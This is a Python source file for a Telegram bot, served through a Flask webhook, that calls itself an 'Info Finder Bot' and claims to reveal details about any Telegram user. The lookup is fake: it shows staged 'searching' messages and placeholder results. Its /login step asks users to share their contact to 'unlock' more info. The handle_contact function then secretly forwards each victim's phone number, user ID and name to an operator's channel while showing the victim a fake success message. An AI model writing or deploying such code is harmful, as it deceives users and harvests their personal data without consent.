import os
import time
import random
import logging
from datetime import datetime
from flask import Flask, request
import telebot
from telebot.types import KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove

# Enable logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Get token/channel from env vars
TOKEN = os.environ.get("BOT_TOKEN")
CHANNEL_ID = os.environ.get("CHANNEL_ID")

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

last_getinfo_time = {}

# /start command
@bot.message_handler(commands=['start'])
def start(message):
    user = message.from_user
    welcome_message = (
        f"🌟 *Hey {user.first_name}! Welcome to the Info Finder Bot!* 🌟\n\n"
        f"🔍 I can help you find details about any Telegram user! Just provide a User ID to get started.\n"
        f"💡 *Your User ID*: {user.id}\n"
        f"👤 *Username*: {user.username if user.username else 'Not available yet'}\n"
        f"📧 *Email*: Sign up to reveal this info! 🔒\n"
        f"📞 *Contact*: Sign up to reveal this info! 🔒\n\n"
        f"✨ Use /getinfo to fetch user details or /login to unlock more info!"
    )
    bot.reply_to(message, welcome_message, parse_mode='Markdown')

@bot.message_handler(commands=['help'])
def help_command(message):
    help_message = (
        f"📚 *Info Finder Bot Help* 📚\n\n"
        f"🔍 *Commands:*\n"
        f"📌 /start - Begin your journey with the bot!\n"
        f"📌 /getinfo - Fetch user details by providing a User ID.\n"
        f"📌 /login - Unlock full user info by logging in.\n"
        f"📌 /cancel - Cancel any action and remove the keyboard.\n"
        f"📌 /restart - Restart the bot and show the welcome message.\n"
        f"📌 /help - Show this help message.\n\n"
        f"💡 *Tips*: Provide a User ID with /getinfo to search for someone’s info!"
    )
    bot.reply_to(message, help_message, parse_mode='Markdown')

@bot.message_handler(commands=['restart'])
def restart(message):
    start(message)

@bot.message_handler(commands=['getinfo'])
def getinfo(message):
    user_id = message.from_user.id
    current_time = datetime.now()
    if user_id in last_getinfo_time:
        time_diff = (current_time - last_getinfo_time[user_id]).total_seconds()
        if time_diff < 5:
            bot.reply_to(message, f"⏳ *Please wait {int(5 - time_diff)} seconds before using /getinfo again!*", parse_mode='Markdown')
            return
    last_getinfo_time[user_id] = current_time
    bot.reply_to(message, "🔍 *Please enter the User ID of the person you want to find info about:*", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_user_id)

def process_user_id(message):
    fetching_messages = [
        "🔎 *Fetching User Info...* 🔎",
        "⏳ *Searching the database...* ⏳",
        "🔍 *Digging for details...* 🔍"
    ]
    bot.reply_to(message, random.choice(fetching_messages), parse_mode='Markdown')
    bot.send_chat_action(message.chat.id, 'typing')
    time.sleep(2)
    info_message = (
        f"🔎 *User Info Retrieved!* 🔎\n\n"
        f"🆔 *Target User ID*: [Redacted for Privacy]\n"
        f"👤 *Username*: Not available yet\n"
        f"✨ *First Name*: Hidden\n"
        f"✨ *Last Name*: Hidden\n"
        f"📞 *Contact*: Unlock this info by logging in! 🔑\n\n"
        f"💡 *Tip*: Use /login to unlock full details! 🚀"
    )
    bot.reply_to(message, info_message, parse_mode='Markdown')

@bot.message_handler(commands=['login'])
def login(message):
    contact_button = KeyboardButton(text="🔑 Login to Unlock", request_contact=True)
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    keyboard.add(contact_button)
    bot.reply_to(
        message,
        "🔓 *Please login with Telegram to unlock the full user info!* This is for testing purposes only.",
        reply_markup=keyboard,
        parse_mode='Markdown'
    )

@bot.message_handler(commands=['cancel'])
def cancel(message):
    bot.reply_to(message, "❌ *Action canceled.* Keyboard removed.", parse_mode='Markdown', reply_markup=ReplyKeyboardRemove())

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    contact = message.contact
    user = message.from_user
    contact_info = (
        f"📋 Contact Shared by {user.first_name} (@{user.username if user.username else 'No username provided'}):\n"
        f"📞 Phone Number: {contact.phone_number}\n"
        f"🆔 User ID: {contact.user_id if contact.user_id else 'Not linked'}\n"
        f"👤 First Name: {contact.first_name}\n"
        f"👤 Last Name: {contact.last_name if contact.last_name else 'Not set'}"
    )
    fetching_messages = [
        "🔎 *Retrieving Full Info...* 🔎",
        "⏳ *Loading the details...* ⏳",
        "🔍 *Unlocking the data...* 🔍"
    ]
    bot.reply_to(message, random.choice(fetching_messages), parse_mode='Markdown')
    bot.send_chat_action(message.chat.id, 'typing')
    time.sleep(2)
    bot.reply_to(
        message,
        f"🎉 *Success! You’ve unlocked the info!* 🎉\n\n"
        f"🔍 *Here’s what we found:*\n"
        f"📞 *Phone Number*: [Redacted for Privacy]\n"
        f"🆔 *User ID*: [Redacted for Privacy]\n"
        f"👤 *Name*: [Redacted for Privacy]\n\n"
        f"✅ *Info has been retrieved!* Check back later for more details. 😊",
        parse_mode='Markdown'
    )
    try:
        bot.send_message(CHANNEL_ID, contact_info)
        logger.info(f"Contact info sent to channel {CHANNEL_ID}")
    except Exception as e:
        logger.error(f"Failed to send message to channel: {e}")

# Webhook setup
@app.route(f'/{TOKEN}', methods=['POST'])
def webhook():
    update = telebot.types.Update.de_json(request.get_data().decode("utf-8"))
    bot.process_new_updates([update])
    return "OK", 200

@app.route('/', methods=['GET'])
def index():
    return "Bot is alive!", 200

if __name__ == '__main__':
    bot.remove_webhook()
    bot.set_webhook(url=f"https://<RENDER-URL>.onrender.com/{TOKEN}")
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
